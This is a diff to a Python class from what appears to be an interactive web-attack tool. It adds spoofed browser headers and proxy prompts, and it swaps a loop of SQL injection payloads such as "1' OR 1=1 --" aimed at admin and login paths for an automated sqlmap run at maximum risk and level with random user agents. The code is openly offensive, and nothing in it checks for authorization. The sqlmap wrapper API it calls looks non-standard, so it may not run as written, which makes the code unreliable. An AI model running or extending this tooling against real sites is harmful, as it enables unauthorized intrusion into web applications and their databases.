@@ -1,13 +1,29 @@
 import requests
 
+from sqlmap import sqlmap
 from helper import *
 
 class Network:
+    def __init__(self):
+        self.headers = {
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+            "Accept-Language": "en-US,en;q=0.9",
+            "Accept-Encoding": "gzip, deflate, br",
+            "Connection": "keep-alive",
+            "Upgrade-Insecure-Requests": "1",
+            "Sec-Fetch-Dest": "document",
+            "Sec-Fetch-Mode": "navigate",
+            "Sec-Fetch-Site": "none",
+            "Sec-Fetch-User": "?1",
+            "Cache-Control": "max-age=0",
+        }
+        
     def get_content(self, address, proxy, d_ipv4):
         try:
             if d_ipv4 and bool(re.match(d_ipv4, address)):
                 address = get_domain(address)
-            r = requests.get(f"http://{address}", proxies=proxy.proxy)
+            r = requests.get(f"http://{address}", headers=self.headers, proxies=proxy.proxy)
             if r.status_code == 200:
                 print(f"\n{r.content.strip()}")
             else:
@@ -17,15 +33,15 @@ class Network:
             
     def get_robots(self, target, proxy):
         try:
-            r = requests.get(f"http://{target}/robots.txt", proxies=proxy)
+            r = requests.get(f"http://{target}/robots.txt", headers=self.headers, proxies=proxy.proxy)
             if "404" not in r.text:
                 print(f"\n{r.text}")
             else:
                 print(f"Unable to fetch robots.txt: file not found in {target}")
         except requests.exceptions.MissingSchema:
             print(f"Unable to fetch robots.txt: file not found in {target}")
-            
-    def try_sql_injection(target, proxy):
+
+    def try_sql_injection(self, target, proxy):
         extensions = ["", ".html", ".htm", ".asp", ".aspx", ".jsp", ".php", ".jspx"]
         directories = ["", "admin", "login", "wp-admin", "cms", "panel", "dashboard", "config", "includes"]
         payloads = [
@@ -41,25 +57,30 @@ class Network:
             "1' OR 1=1 --"
         ]
 
-        succeeded = False
+        successfull = False
         for d in directories:
             for ext in extensions:
                 url = f"{target}/{d}{ext}"
-                for payload in payloads:
-                    try:
-                        response = requests.get(f"{url}?id={payload}", timeout=5, proxies=proxy)
-                        if "error" in response.text.lower():
-                            print(f"[!] Possible SQL injection vulnerability found on {url} with payload: {payload}")
-                            print(f"Response: {response.text[:200]}...")
-                            succeeded = True
-                        else:
-                            print(f"[+] No SQL injection detected on {url} with payload: {payload}")
-                    except requests.exceptions.RequestException as e:
-                        continue
-                        
-        if not succeeded:
-            print("None of the common sql injection payloads worked")
-            
+                try:
+                    sqlmap_instance = sqlmap.sqlmap()
+                    sqlmap_instance.set_url(f"http://{url}?id=1")
+
+                    sqlmap_instance.set_risk(3)
+                    sqlmap_instance.set_level(5)
+                    sqlmap_instance.set_random_agent(True)
+                    sqlmap_instance.set_batch(True)
+                    sqlmap_instance.set_output_dir("sqlmap_output")
+
+                    sqlmap_instance.run()
+                    print(sqlmap_instance.get_output())
+                    successfull = True
+
+                except Exception as e:
+                   continue
+               
+        if not successfull:
+            print(f"\nNone of the sql injection attempts on {url} worked")
+                
     def att_port_80(self, target, proxy):            
         choice = input(f"\nPort 80 is open, do you want to fetch the contents of {target}, which is hosted on this ip? [y/n] ")
         if choice == "y":
@@ -67,12 +88,12 @@ class Network:
                 p_choice = input("\nYou have no active proxy, do you want to use one before attacking this web page? [y/n] ")
                 if p_choice == "y":
                     proxy.get_proxy()
-            self.network.get_content(target, proxy, d_ipv4=None)
+            self.get_content(target, proxy, d_ipv4=None)
     
         choice_2 = input(f"\nDo you want to try and fetch the robots.txt file from {target}? [y/n] ")
         if choice_2 == "y":
-            self.network.get_robots(target, proxy)
+            self.get_robots(target, proxy)
             
         choice_3 = input(f"\nDo you want to try common sql injection payloads on {target}? [y/n] ")
         if choice_3 == "y":
-            self.network.try_sql_injection(target, proxy)
+            self.try_sql_injection(target, proxy)
